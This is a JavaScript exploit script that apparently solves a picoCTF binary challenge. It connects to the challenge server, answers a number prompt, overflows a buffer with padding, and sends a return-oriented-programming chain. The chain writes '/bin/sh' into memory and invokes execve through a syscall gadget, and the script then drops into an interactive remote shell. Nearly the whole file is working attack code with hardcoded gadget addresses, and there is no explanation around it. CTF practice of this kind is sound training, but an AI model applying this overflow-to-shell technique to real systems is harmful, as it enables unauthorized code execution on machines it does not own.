import nc from "../nc.js";
import convo from "../convo.js"
import { printf, shell } from "../util.js";

const cat = new nc("nc jupiter.challenges.picoctf.org 26735");

const answer = 84;

await cat.readUntil("What number would you like to guess?");
await cat.write(answer + "\n");
await cat.readUntil("Name?");

const POP_RSP = 0x401e93n;
const LEAVE = 0x400c3en;
const SYSCALL = 0x040137cn;
const POP_RDI = 0x0400696n;
const POP_RSI = 0x410ca3n;
const POP_RAX = 0x4163f4n;
const POP_RDX = 0x44a6b5n;

const fgets = 0x410a10n; // we got write so this uselesss
const arbw = 0x447d7bn;
const sys_execve = 59n;
const ropCALL = (target, ...args) => {
    if (args.length > 3) throw new Error("args.length > 3");
    let params = [];
    if (args.length > 0) params.push(POP_RDI, args[0]);
    if (args.length > 1) params.push(POP_RSI, args[1]);
    if (args.length > 2) params.push(POP_RDX, args[2]);
    params.push(...(Array.isArray(target) ? target : [target]))
    return params
}

const SPACE = 0x06ba440n;
await cat.write('A'.repeat(120))
let h = convo.raw([
    // 0x400c8cn
    ropCALL(arbw, SPACE, "/bin/sh\x00"),
    ropCALL(arbw, SPACE+8n, SPACE),
    [POP_RAX, sys_execve],
    // 0x400c8cn
    ropCALL(SYSCALL, SPACE, SPACE+8n, 0n)
])

await cat.write(h)
await cat.write("\n")

await cat.readUntil("Congrats");
await cat.readline();

await shell(cat)

await cat.kill();